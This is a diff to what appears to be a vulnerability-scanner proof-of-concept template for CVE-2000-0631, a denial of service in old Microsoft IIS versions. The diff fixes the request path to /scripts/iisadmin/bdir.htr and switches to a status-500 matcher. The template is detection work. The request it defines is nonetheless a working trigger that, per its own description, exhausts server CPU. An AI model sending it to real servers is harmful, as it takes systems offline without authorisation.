@@ -1,8 +1,8 @@
 [info]
 author = "AVE"
-description = "检测 Microsoft IIS 3.0/4.0/5.0 管理脚本因缺少目录浏览参数导致的拒绝服务漏洞。向 IIS 管理脚本发送缺少特定参数的 GET 请求，可导致 IIS 服务消耗全部 CPU 资源并停止响应。"
+description = "通过访问 IIS /scripts/iisadmin/bdir.htr 管理脚本时不提供预期参数，触发无限循环耗尽 CPU 资源，导致拒绝服务。影响 IIS 3.0/4.0/5.0（从 IIS 3.0 升级而来）。"
 id = "POC-AVE-2000-0766"
-name = "CVE-2000-0631 PoC"
+name = "Microsoft IIS Absent Directory Browser Argument DoS PoC"
 severity = "medium"
 tags = [
     "cve-2000-0631",
@@ -15,18 +15,14 @@ vuln_id = [
 ]
 
 [poc]
-logic = "all"
+logic = "any"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/iisadmin/bdir.htr"
+path = "/{{BaseURL}}/scripts/iisadmin/bdir.htr"
 protocol = "http"
 
 [[poc.requests.matchers]]
 expect = true
-part = "body"
-type = "word"
-words = [
-    "200",
-    "500",
-]
+status = [500]
+type = "status"
